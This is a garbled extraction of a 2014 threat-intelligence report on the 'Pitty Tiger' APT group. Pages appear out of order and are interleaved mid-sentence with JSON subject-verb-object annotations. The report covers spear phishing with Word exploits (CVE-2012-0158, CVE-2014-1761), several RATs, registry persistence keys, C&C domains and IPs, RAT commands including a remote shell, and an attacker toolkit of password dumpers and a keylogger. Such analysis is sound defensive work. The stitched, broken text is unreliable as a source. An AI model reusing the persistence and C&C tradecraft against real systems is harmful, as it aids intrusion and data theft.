Eye of the Tiger\u201d                         Page : 11/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n<section>\n<heading>\n    MALWARE INFORMATION\n</heading>\n</section>\n<section>\n          <heading>TROJ/REROL.A</heading>\n    One of the favorite methods used by the Pitty Tiger group to infect users is to use a Microsoft Office\n    Word document which exploits a specific vulnerability": [{"use": {"A": "use", "S": "the Pitty Tiger group", "O": ["to infect users", "a Microsoft Office Word document which exploits a specific vulnerability"]}}], " The variants we have seen did use that same User-\n    Agent:\n<list>\n                      Mozilla/4.0 (compatible;)\n</list>\n\n    The persistence mechanism used by the malware is the creation of a registry key named \u201cShell\u201d\n    containing the path to the malware on the infected system:\n<list>\n              Key Path: \\REGISTRY\\USER\\<SID>\\Software\\Microsoft\\Windows\n              NT\\CurrentVersion\\Winlogon\n              Value Name : Shell\n              Value : explorer.exe,C:\\DOCUME~1\\XXXXXX\\APPLIC~1\\svohost.exe,\n</list>\n\n    The payload of this malware is used to collect information on the newly infected host, and send it\n    back to the c&c server": [{"is": {"A": "is", "S": "The persistence mechanism", "O": ["the creation of a registry key named \u201cShell\u201d containing the path to the malware on the infected system"]}}, {"used": {"A": "used", "S": "the malware", "O": ["The persistence mechanism"]}}, {"send": {"A": "send", "S": "The payload of this malware", "O": ["it", "back to the c&c server"]}}, {"is used": {"A": "is used", "O": ["to collect information on the newly infected host", "The payload of this malware"]}}], "\n\n    We have been able to find a spear phishing e-mail crafted by the attackers": [{"crafted": {"A": "crafted", "S": "the attackers", "O": ["a spear phishing e-mail"]}}], "\n\n    Please note that at this point, the attacker has at least the privileges of a local administrator, since\n    he is allowed to write content in the system32 folder of a Windows XP system": [{"write": {"A": "write", "S": "he", "O": ["content", "in the system32 folder of a Windows XP system"]}}, {"has": {"A": "has", "S": "the attacker", "O": ["at least the privileges of a local administrator"]}}], " The data following the header is encrypted using RC4 with\n    the previous key": [{"is encrypted": {"A": "is encrypted", "O": ["The data following the header", "with the previous key", "using RC4"]}}], " After being injected, it starts sending its Hello\n    packet to its c&c server:\n\n\n\n<figure></figure>\n                                     <caption>Sample communication from PittyTiger RAT</caption>\n\n\n</section>\n\n \n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 17/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n<section>\n    <heading>Command & Control</heading>\n\n    All the requests sent to the c&c contains the string \u201c/FC001/\u201d followed by the bot id": [{"sent": {"A": "sent", "O": ["All the requests", "to the c&c"]}}, {"sending": {"A": "sending", "S": "it", "O": ["its Hello packet", "to its c&c server"]}}], "\n\n    Moreover, the built malware we found in the same folder was configured to connect to a local IP\n    address, probably for testing purposes": [{"connect": {"A": "connect", "S": "the built malware we found in the same folder", "O": ["to a local IP address"]}}], "\n\n    The data sent is simply encoded using base64, there is no cipher at all": [{"is simply encoded": {"A": "is simply encoded", "O": ["The data sent", "using base64"]}}], " This one is also used by the group to infect\n    workstations, collect system information, and install more malware on the infected computer": [{"collect": {"A": "collect", "S": "This one", "O": ["system information"]}, "install": {"A": "install", "S": "This one", "O": ["on the infected computer", "more malware"]}, "infect": {"A": "infect", "S": "This one", "O": ["workstations"]}}], "\n\n    As soon as the attackers are sure they have enough access, they start looking for two things:\n    intellectual property (or anything else they want to know or steal) in alignment with predefined\n    mission objectives, and a means of privilege escalation to facilitate lateral movement within the\n    compromised environment": [{"looking": {"A": "looking", "S": "they", "O": ["for a means of privilege escalation to facilitate lateral movement within the compromised environment"]}}], " Up to 5 c&c servers\n    can be configured, but our sample only had one: \u201cey.avstore.com.tw:53\u201d": [{"be configured": {"A": "be configured", "O": ["Up to 5 c&c servers"]}}], "\n    Remember to look down!\n\n\n    XXXXXX\n</figure>\n\n    The attached file is a Microsoft Office Word document triggering CVE-2014-1761 to infect the\n    computer it is sent to:\n\n\n\n<figure></figure>\n                          <caption>Word document used to infect computers with Troj/ReRol.A</caption>\n\n\n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 9/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n    While this example looks very \u201camateur\u201d for a spear phishing attempt, we suppose the group has\n    conducted more advanced spear phishing campaigns, based on the fact that we found infected\n    Word documents showing content stolen from victims of the group": [{"triggering": {"A": "triggering", "S": "a Microsoft Office Word document", "O": ["CVE-2014-1761", "to infect the computer it is sent to"]}}, {"conducted": {"A": "conducted", "S": "the group", "O": ["more advanced spear phishing campaigns"]}}, {"stolen": {"A": "stolen", "O": ["content", "from victims of the group"]}}], " According to the name of the files and the general\n    feel of the archive, we do think it was extracted by the attackers to \u201cshow\u201d someone what kind of\n    data they could get from the compromise of that particular target": [{"was extracted": {"A": "was extracted", "S": "the attackers", "O": ["it", "to \u201cshow\u201d someone what kind of data they could get from the compromise of that particular target"]}}], "\n\n</section>\n\n\n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 6/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n<section>\n            <heading>DATA EXFILTRATION</heading>\n\n    Data exfiltration is the last step before the attackers loop to the lateral moves step, in a never-ending\n    circle of prolonged access and information theft": [{"is": {"A": "is", "S": "Data exfiltration", "O": ["the last step"]}}], "\n    These addresses are listed below:\n<list>\n        -   63.251.83.36\n        -   64.74.96.242\n        -   69.251.142.1\n        -   212.118.243.118\n        -   216.52.184.230\n        -   61.145.112.78\n        -   218.16.121.32\n</list>\n</section>\n<section>\n    <heading>Command & Control</heading>\n\n    It starts resolving its domains after injection, and immediately sends requests": [{"resolving": {"A": "resolving", "S": "It", "O": ["after injection", "its domains"]}, "sends": {"A": "sends", "S": "It", "O": ["requests"]}}], "\n\n\n\n<footnote>\n    1\n     http://nakedsecurity.sophos.com/2012/08/03/poisoned-doc-targeted-malware-attack/\n    2\n     http://nakedsecurity.sophos.com/2010/06/24/targeted-trident-cyberattack-defence-company/\n</footnote>\n</section>\n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 8/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n<section>\n<heading>\n    INFECTION METHODS\n</heading>\n</section>\n<section>\n          <heading>SPEAR PHISHING AND WEAPONIZED DOCUMENTS</heading>\n\n    Pitty Tiger, like most other APT groups, use spear phishing e-mails extensively in order to gain an\n    initial foothold within the targeted environment": [{"use": {"A": "use", "S": "Pitty Tiger", "O": ["extensively", "in order to gain an initial foothold within the targeted environment", "spear phishing e-mails"]}}], " It acts\n    as a first stage downloader and system data collector often used in the initial compromise of the\n    Pitty Tiger campaigns, generally embedded in Microsoft Office documents": [{"acts": {"A": "acts", "S": "It", "O": ["as a first stage downloader"]}, "embedded": {"A": "embedded", "S": "It", "O": ["in Microsoft Office documents"]}}], "\n\n    We discovered several different documents spreading this malware by triggering CVE-2012-0158\n    vulnerability, yet we could not share them in this report, since these documents contain information\n    about victims of the Pitty Tiger group": [{"spreading": {"A": "spreading", "S": "several different documents", "O": ["by triggering CVE-2012-0158 vulnerability", "this malware"]}}], " In POST commands, the CGI name represents the command": [{"represents": {"A": "represents", "S": "the CGI name", "O": ["the command", "In POST commands"]}}], " The controllers for these RATs show Chinese language;\n        \uf0b7   Several binaries used by the attackers show either \u201cChinese - China\u201d or \u201cChinese-Taiwan\u201d\n            language ID in their resources;\n        \uf0b7   A decoy Word document has been found, written in Chinese language;\n</list>\n    The IP addresses used for the hosting of the c&c domains are mainly located in Taipei (Ta\u00efwan) and\n    Hong Kong City (Hong Kong Special Administrative Region, PRC):\n\n\n\n\n    <footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 53/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n<figure></figure>\n\n\n                          <caption>Hosting information links for the c&c servers used in this campaign</caption>\n\n\n\n    Most RDP connections to the c&c infrastructure come from Chinese IP ranges in Fuqing (Fujian\n    province, PRC)": [{"come": {"A": "come", "S": "Most RDP connections to the c&c infrastructure", "O": ["from Chinese IP ranges in Fuqing (Fujian province, PRC)"]}}, {"used": {"A": "used", "O": ["for the hosting of the c&c domains", "The IP addresses"]}}], " Furthermore, no authentication is required to send\n    commands to the c&c (but you need to know the configured password to interact with the bots)": [{"send": {"A": "send", "O": ["to the c&c", "commands"]}}], "\n    Moreover, the same commands are implemented in both RATs": [{"are implemented": {"A": "are implemented", "O": ["in both RATs", "the same commands"]}}], "\n\n    Persistence is achieved by adding the path to the binary to the Winlogon Shell key:\n<figure>\n                 Key Path: \\REGISTRY\\USER\\<SID>\\Software\\Microsoft\\Windows\n                 NT\\CurrentVersion\\Winlogon\n                 Value Name: Shell\n                 Value: explorer.exe,C:\\DOCUME~1\\<UserName>\\APPLIC~1\\<binary name>,\n</figure>\n\n    The RAT embeds its own DNS server IP addresses to make the c&c domain names resolutions": [{"is achieved": {"A": "is achieved", "O": ["by adding the path to the binary to the Winlogon Shell key", "Persistence"]}}, {"embeds": {"A": "embeds", "S": "The RAT", "O": ["its own DNS server IP addresses", "to make the c&c domain names resolutions"]}}], " These documents were infecting\n    the system with Troj/ReRol.A malware, which we will detail later in this report": [{"were infecting": {"A": "were infecting", "S": "These documents", "O": ["with Troj/ReRol.A malware", "the system"]}}], " It immediately triggers\n    alarms on our sandbox:\n\n\n\n<figure></figure>\n                            <caption>Alarms in our sandbox system, triggered by the Troj/ReRol.A malware</caption>\n\n\n\n    The binary drops a copy of itself in the Application Data folder of the currently logged-in user:\n\n\n<figure></figure>\n\n                          <caption>Creation of a copy of the Pitty Tiger malware in a user folder in our sandbox</caption>\n\n\n\n    The malware initiates a communication to time.windows.com to check for connectivity, and then\n    communicates with the c&c server at mac.avstore.com.tw": [{"initiates": {"A": "initiates", "S": "The malware", "O": ["to time.windows.com", "a communication"]}, "communicates": {"A": "communicates", "S": "The malware", "O": ["with the c&c server", "at mac.avstore.com.tw"]}, "check": {"A": "check", "S": "The malware", "O": ["for connectivity"]}}, {"drops": {"A": "drops", "S": "The binary", "O": ["a copy of itself", "in the Application Data folder of the currently logged-in user"]}}], " Not only is it one more indicator of a probable Chinese origin, but also an\n    indicator that this server was probably used as a test base, in addition to being operational and\n    controlling infected machines from different targets": [{"controlling": {"A": "controlling", "S": "this server", "O": ["infected machines from different targets"]}}], "\n\n    The payload infecting the system is malware known as \u201cTroj/ReRol.A\u201d": [{"infecting": {"A": "infecting", "S": "The payload", "O": ["the system"]}}], " The hello packet, once\n    decoded, looks like the following:\n    <figure>\n\n                 --------------------------PittyTigerV1.0                           ---------------------\n                 --------------                           ^ ^            ----------------------------\n                 --------------                             ^            ----------------------------\n                 Version:NULL\n</figure>\n\n    Our sample had 3 c&c servers configured:\n<list>\n       - jackyandy.avstore.com.tw:80\n       - chanxe.avstore.com.tw:443\n       - newb02.skypetm.com.tw:80\n</list>\n    The following commands are implemented:\n<list>\n       - File Download (get) and Upload (put)\n       - Screen Capture 8bit (prtsc) and 16bit (prtsc2)\n       - Remote Shell (ocmd/ccmd)\n       - Configuration update (setserv/freshserv)\n       - Direct command execution\n</list>\n    Regarding the controller part, we found two different versions:\n<list>\n       - A Delphi binary handling PittyTiger connections only\n       - A .NET binary handling both PittyTiger and CT connections\n</list>\n    The interface handling both Pitty TIGER and CT connections is very interesting": [{"are implemented": {"A": "are implemented", "O": ["The following commands"]}}, {"configured": {"A": "configured", "S": "Our sample", "O": ["3 c&c servers"]}}], " The file is ciphered using RC4, using\n    the MD5 hash of \u201crEdstArs\u201d as the key": [{"is ciphered": {"A": "is ciphered", "O": ["using the MD5 hash of \u201crEdstArs\u201d as the key", "using RC4", "The file"]}}], "\n\n<figure></figure>\n\n\n                                            <caption>Pitty Tiger RAT \u2013 controller part</caption>\n\n</section>\n\n\n\n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 18/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n<section>\n\n\n           <heading>CT RAT</heading>\n\n    This remote administration tool is often used by the Pitty Tiger group": [{"is often used": {"A": "is often used", "S": "the Pitty Tiger group", "O": ["This remote administration tool"]}}], "\n\n    Thanks to server\u2019s misconfigurations, we managed to get information from three c&c servers used\n    by this group of attackers, which provided us with insight from the end of 2013 to the beginning of\n    July 2014": [{"used": {"A": "used", "S": "this group of attackers", "O": ["three c&c servers"]}}], "\n\n    The attackers mostly rely on two techniques here to infect one or several computers, usually\n    workstations, inside the target\u2019s network: spear phishing and drive-by downloads": [{"rely": {"A": "rely", "S": "The attackers", "O": ["on spear phishing and drive-by downloads"]}}], " It generally does not take long before the attackers gain domain\n    administrator privileges and dump all the Active Directory content": [{"dump": {"A": "dump", "S": "the attackers", "O": ["all the Active Directory content"]}, "gain": {"A": "gain", "S": "the attackers", "O": ["domain administrator privileges"]}}], "\n\n    The RAT can then receive commands from its c&c": [{"receive": {"A": "receive", "S": "The RAT", "O": ["commands", "from its c&c"]}}], "\n\n    Some groups of attackers also use \u201cwatering hole\u201d techniques to successfully compromise their\n    targets": [{"use": {"A": "use", "S": "Some groups of attackers", "O": ["\u201cwatering hole\u201d techniques", "to successfully compromise their targets"]}}], "\n\n\n\n\n    <footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 48/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n<figure></figure>\n\n\n                                         <caption>Proposal for PittyTiger team structure</caption>\n\n</section>\n<section>\n          <heading>ATTACKERS ARSENAL</heading>\n    The c&c servers used by the attackers revealed a lot of interesting files stored in various folders:\n<table>\n    Filename                    Description                                                   Public tool ?\n    32m.exe    /   3200.exe   / MM RAT                                                        No\n    ieupdate.exe / insert.exe /\n    khuvaxu.exe\n    32mm.exe / mm32.exe         CT RAT                                                        No\n    322.exe                     Chinese version of calc.exe, probably for                     Yes\n                                testing purposes\n    client.exe                  File transfer tool, via pipes                                 No\n    CP.exe/CP_sep.exe           Microsoft Outlook dumper                                      No\n    CT.exe                      Controller for CT RAT (2013.10)                               No\n    ct1.exe                     Controller for both CT RAT and PittyTiger RAT                 No\n    Diruse.exe                  Tool to display disk usage for a directory tree               Yes\n    GlobalWind.exe              Controller for Pitty Tiger                                    No\n    gsec1.exe                   GSecDump password dumper                                      Yes\n    http.exe/wsup.exe           Controller for MM RAT                                         No\n\n\n    <footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 49/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n\n\n    km.exe                              \u201cToyi\u201d keylogger                                       No\n    logreader.exe                       Tool to decrypt the km.exe keylogger data              No\n    Mailpv.exe                          \u201cMail PassView\u201d tool, to extract e-mail                Yes\n                                        passwords from various e-mail clients": [{"used": {"A": "used", "S": "the attackers", "O": ["The c&c servers"]}}], "\n\n    Persistence is achieved via the following registry key:\n    <figure>\n\n              Key Path: \\REGISTRY\\USER\\<SID>\\Software\\Microsoft\\Windows\n              NT\\CurrentVersion\\Windows\n              Value Name: load\n              Value: c:\\PROGRA~1\\INTERN~1\\ieupdate.exe\n</figure>\n\n    After injection, the RAT sends a first login packet to its c&c:\n\n<figure></figure>\n\n\n                             <caption>Encrypted communication from a machine infected with CT RAT</caption>\n</section>\n<section>\n    <heading>Command & Control</heading>\n\n    The RAT communication is performed through HTTP requests": [{"sends": {"A": "sends", "S": "the RAT", "O": ["to its c&c", "a first login packet"]}}, {"is performed": {"A": "is performed", "O": ["through HTTP requests", "The RAT communication"]}}, {"is achieved": {"A": "is achieved", "O": ["via the following registry key", "Persistence"]}}], "\n\n    This could mean that the Pitty Tiger group is using stolen material as spear phishing content either\n    to target other persons in the compromised company, or to target other persons in a competitor\u2019s\n    company, or more generally to compromise another target": [{"is using": {"A": "is using", "S": "the Pitty Tiger group", "O": ["stolen material", "as spear phishing content"]}}], " The attackers loop to the access strengthening/lateral\n    moves stage and generally keep stealing more information and stay inside the network for more\n    data gathering": [{"stealing": {"A": "stealing", "S": "The attackers", "O": ["more information"]}, "stay": {"A": "stay", "S": "The attackers", "O": ["inside the network", "for more data gathering"]}}], " We do not\n    currently know why this malware uses the same patterns to communicate": [{"uses": {"A": "uses", "S": "this malware", "O": ["to communicate", "the same patterns"]}}], " While some\n    targets have been scanned with \u201cgeneric\u201d vulnerability scanning tools like HScan or Fluxay and port\n    scanners like Nmap, some other targets have been scanned for very specific vulnerabilities, like a\n    ZyWALL vulnerability or a FORTINET product": [{"been scanned": {"A": "been scanned", "O": ["some other targets", "for very specific vulnerabilities, like a ZyWALL vulnerability or a FORTINET product"]}}, {"been scanned": {"A": "been scanned", "O": ["with \u201cgeneric\u201d vulnerability scanning tools like HScan or Fluxay and port scanners like Nmap", "some targets"]}}], " The following alarms are\n    triggered in the sandbox:\n\n\n<figure></figure>\n\n                               <caption>Alarms in our sandbox system, triggered by the Paladin RAT</caption>\n\n    The shellcode contained in the Word file drops the following file, and executes it:\n<list>\n       - C:\\Documents and Settings\\<User>\\Local Settings\\Temp\\svohost.exe<fn>2</fn>\n</list>\n    This one drops in turn the following file:\n\n\n<footnote>\n\n    1\n        http://la.trendmicro.com/media/misc/lurid-downloader-enfal-report-en.pdf\n    2\n        MD5 hash: 0567fd7484efbae502cac279d32ed518\n        </footnote>\n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 26/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n\n<figure></figure>\n                                      <caption>File dropped by the malware in our sandbox</caption>\n\n    This tmp file is then copied to \u201cC:\\Windows\\system32\\Nwsapagentex.dll\u201d and registered as a service\n    called \u201cNwsapagent\u201d": [{"drops": {"A": "drops", "S": "This one", "O": ["in turn the following file"]}}, {"is then copied": {"A": "is then copied", "O": ["This tmp file", "to \u201cC:\\Windows\\system32\\Nwsapagentex.dll\u201d"]}, "registered": {"A": "registered", "O": ["This tmp file", "as a service called \u201cNwsapagent\u201d"]}}, {"drops": {"A": "drops", "S": "The shellcode contained in the Word file", "O": ["the following file"]}, "executes": {"A": "executes", "S": "The shellcode contained in the Word file", "O": ["it"]}}], "\n\n\n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 20/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n\n\n    The Login packet contains the following string, after decoding and deciphering:\n<figure>\n               Login\n               ->C:PC-XXX\n               ->U:User-XXX\n               ->L:10.10.10.1\n               ->S:Microsoft Windows XP Service Pack 3 5.1 2600\n               ->M:Nov 13 2013\n               ->P:1033\n</figure>\n\n    It contains the computer name, the user name, the internal IP address, the OS version, the RAT\n    internal version and the Language ID of the system": [{"contains": {"A": "contains", "S": "It", "O": ["the internal IP address"]}}], " It drops the \u201cpacket64.dll\u201d, and\n    injects it in \u201cexplorer.exe\u201d": [{"injects": {"A": "injects", "S": "It", "O": ["it", "in \u201cexplorer.exe\u201d"]}, "drops": {"A": "drops", "S": "It", "O": ["the \u201cpacket64.dll\u201d"]}}], " When\n    opened, it shows a single line written in Chinese language, which can be translated as \u201cHello!\u201d\n\n\n\n<figure></figure>\n                          <caption>Microsoft Office Word decoy \u201ctest document\u201d used by the Pitty Tiger group</caption>\n</section>\n<section>\n    <heading>Installation</heading>\n\n    When successfully triggered, the exploit infects the host by dropping and executing a file named\n    \u201csvohost.exe\u201d<fn>2</fn> in the temporary folder of the currently logged-in user:\n\n<footnote>\n    1\n     MD5 hash: e70c0479cdb9aa031a263740365e7939\n    2\n     MD5 hash: 1752aacc08ee0acd58405e9bc10b0dbb\n</footnote>\n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 12/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n<list>\n                      C:\\DOCUME~1\\USER\\LOCALS~1\\Temp\\svohost.exe\n</list>\n\n    This binary is \u201cTroj/ReRol.A\u201d according to Sophos naming convention<fn>1</fn>": [{"infects": {"A": "infects", "S": "the exploit", "O": ["the host"]}, "executing": {"A": "executing", "S": "the exploit"}, "dropping": {"A": "dropping", "S": "the exploit"}}], " The trick\n    is to target the right victim and provide it with the right content, so that they will click on a link leading\n    to drive-by download of a malware, or open an attached file which will infect their computer": [{"provide": {"A": "provide", "O": ["with the right content", "it"]}}, {"target": {"A": "target", "O": ["the right victim"]}}, {"open": {"A": "open", "S": "they", "O": ["an attached file which will infect their computer"]}, "click": {"A": "click", "S": "they", "O": ["on a link leading to drive-by download of a malware"]}}], "\n\n    They generally create archive files containing the content they want to exfiltrate, which are then sent\n    to the attackers by using a remote administration tool (RAT) or transfer protocols such as FTP and\n    HTTP": [{"create": {"A": "create", "S": "They", "O": ["archive files containing the content they want to exfiltrate"]}, "are then sent": {"A": "are then sent", "O": ["archive files containing the content they want to exfiltrate"]}}], " The data is sent encrypted with\n    RC4, and base64-encoded": [{"is sent": {"A": "is sent", "O": ["encrypted with RC4, and base64-encoded", "The data"]}}], " It just takes a few lines of code in the infecting script\n    to only compromise visitors coming from the target IP ranges": [{"compromise": {"A": "compromise", "O": ["visitors coming from the target IP ranges"]}}], "\n\n    Spear phishing can be described as targeted e-mail phishing": [{"be described": {"A": "be described", "O": ["Spear phishing", "as targeted e-mail phishing"]}}], "\n\n    Pitty Tiger also seem to use fake Microsoft Office Excel content, yet we could only find empty\n    content delivering once again the Troj/ReRol.A malware": [{"use": {"A": "use", "S": "Pitty Tiger", "O": ["fake Microsoft Office Excel content"]}}], "\n\n<figure></figure>\n\n\n                              <caption>IP addresses used by the 50PZ80C-1DFDCB8 machine</caption>\n\n\n    <footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 42/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n\n\n    The two computers FLY-THINK and 50PZ80C-1DFDCB8 have used distinct IP addresses to\n    connect to the c&c, yet some of these IP addresses come from the same IP range:\n\n<figure></figure>\n\n\n                          <caption>IP ranges overlapping between two machines used by the attackers</caption>\n\n    We mapped these RDP connections to have a graphical view:\n\n\n\n\n   <footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 43/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n<figure></figure>\n                                     <caption>RDP connections from the attackers to one c&c server</caption>\n\n</section>\n<section>\n          <heading>\u201cTOOT\u201d</heading>\n\n    We found that a member of this group of attackers used some tools on his own system, for testing\n    purposes": [{"used": {"A": "used", "S": "The two computers FLY-THINK and 50PZ80C-1DFDCB8", "O": ["to connect to the c&c", "distinct IP addresses"]}}], "\n\n    Interestingly enough, we saw a part of these documents appear on Virus-Total, with an additional\n    \u201cgift\u201d from the attackers, a payload dropping a malware": [{"dropping": {"A": "dropping", "S": "a payload", "O": ["a malware"]}}], "\n    The communication protocol is quite simple: GET requests are used to receive data from the c&c,\n    and POST requests to send data": [{"send": {"A": "send", "S": "POST requests", "O": ["data"]}}, {"are used": {"A": "are used", "O": ["GET requests", "to receive data from the c&c"]}}], "\n\n    The attackers have been using different vulnerability scanners aimed at their targets": [{"been using": {"A": "been using", "S": "The attackers", "O": ["different vulnerability scanners aimed at their targets"]}}], "\n\n    Unlike others c&c binaries, the c&c part of this RAT does not have a graphical interface, but can be\n    remotely requested to manage the bots": [{"be remotely requested": {"A": "be remotely requested", "O": ["to manage the bots", "the c&c part of this RAT"]}}], "\n\n\n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 14/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n\n    Here is an anonymized sample of communication showing information collected by the malware:\n<figure>\n              HostName :xxx\n              UserName :xxx\n              SysType :32bit\n\n              Windows 7 Enterprise Service Pack 1 6.1 7601\n              Organization:\n              Owner:xxx\n\n              --------------Server Info-------------------\n              - AdobeARMservice\n              - Adobe Acrobat Update Service\n              - AeLookupSvc\n              - Application Experience\n              - AudioEndpointBuilder\n              - \u2026 (list goes on)\n\n              --------------Soft Info-------------------\n                     1   Adobe AIR 4.0.0.1390\n                     2   Adobe Shockwave Player 12.0 12.0.9.149\n                     3   FileZilla Client 3.7.4.1 3.7.4.1\n                     4   Mozilla Thunderbird 24.3.0 (x86 en-US) 24.3.0\n                     5   \u2026 (list goes on)\n\n\n              --------------IP Config-------------------\n              Adapt Type: Ethernet\n              NetCardNum:       11\n              NetCard Name:     {XXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}\n              Description :     Realtek RTL8139C+ Fast Ethernet NIC\n              MAC-ADDR:         XX-XX-XX-XX-XX-XXX\n              IP-Addr:          10.xxx.xxx.xxx\n              IP-Mask:          255.255.255.0\n              GateWay:          10.xxx.xxx.xxx\n              DHCP Serv:        1\n              DHCP Host:        10.xxx.xxx.xxx\n              WINS Serv:        0\n              WINS PriHost:\n              WINS SecHost:\n</figure>\n                                 <caption>Sample information collected by Troj/ReRol.A malware</caption>\n\n\n    This information is very useful for an attacker: it shows all software installed on the system, and\n    running services": [{"shows": {"A": "shows", "S": "it", "O": ["running services"]}}, {"collected": {"A": "collected", "S": "the malware", "O": ["information"]}}], " The IP is\n    in an ADSL dynamic pool in the Gangzhou area (Guangdong province):\n\n\n\n\n   <footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 40/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n<figure></figure>\n\n                                          <caption>IP address used by CHMXY-PC</caption>\n\n    A few connections to the c&c were done by a computer named TIEWEISHIPC with IP address\n    27.16.139.143": [{"were done": {"A": "were done", "S": "a computer named TIEWEISHIPC with IP address 27.16.139.143", "O": ["A few connections to the c&c"]}}], " This vulnerability which exists on some old\n    versions of OpenSSL allows attackers to collect data from chunks of memory from the targeted\n    machine": [{"collect": {"A": "collect", "S": "attackers", "O": ["from chunks of memory from the targeted machine", "data"]}}], " First requests are\n    used to check for updates (GET request on /httpdocs/update/update.ini)": [{"are used": {"A": "are used", "O": ["requests", "to check for updates (GET request on /httpdocs/update/update.ini)"]}}], "\n\n    Our sample uses \u201cmca.avstore.com.tw\u201d, \u201cstar.yamn.net\u201d and \u201cbz.kimoo.com.tw\u201d as c&c servers": [{"uses": {"A": "uses", "S": "Our sample", "O": ["\u201cmca.avstore.com.tw\u201d, \u201cstar.yamn.net\u201d and \u201cbz.kimoo.com.tw\u201d", "as c&c servers"]}}], "\n\n    Persistence is achieved by adding the path to the binary to the WinlogonUserInit key:\n<list>\n              Key Path: \\REGISTRY\\USER\\<SID>\\Software\\Microsoft\\Windows\n              NT\\CurrentVersion\\Winlogon\n              Value Name: UserInit\n              Value: C:\\WINDOWS\\system32\\userinit.exe,C:\\WINDOWS\\system32\\qmgrxp.exe,\n</list>\n\n    The \u201cpacket64.dll\u201d is the main payload of the RAT": [{"is achieved": {"A": "is achieved", "O": ["by adding the path to the binary to the WinlogonUserInit key", "Persistence"]}}], " In a spear phishing scheme, attackers\n    send very few e-mails to targeted people": [{"send": {"A": "send", "S": "attackers", "O": ["to targeted people", "In a spear phishing scheme", "very few e-mails"]}}], "\n       \uf0b7 Someone from another company has been targeted with this document": [{"been targeted": {"A": "been targeted", "O": ["with this document", "Someone from another company"]}}], " He could also gain\n    the credentials to a sensitive e-mail account": [{"gain": {"A": "gain", "S": "He", "O": ["the credentials to a sensitive e-mail account"]}}], " This is another remote administration\n    tool often used by the Pitty Tiger crew": [{"used": {"A": "used", "S": "the Pitty Tiger crew", "O": ["another remote administration tool"]}}], "\n    They need to install several different backdoors in order to be able to always access the network": [{"install": {"A": "install", "S": "They", "O": ["several different backdoors", "in order to be able to always access the network"]}}], "\n</section>\n<section>\n    <heading>Exploitation</heading>\n\n    We have been able to find one such document<fn>1</fn> used by that group of attacker, exploiting CVE-\n    2012-0158, an old critical vulnerability impacting 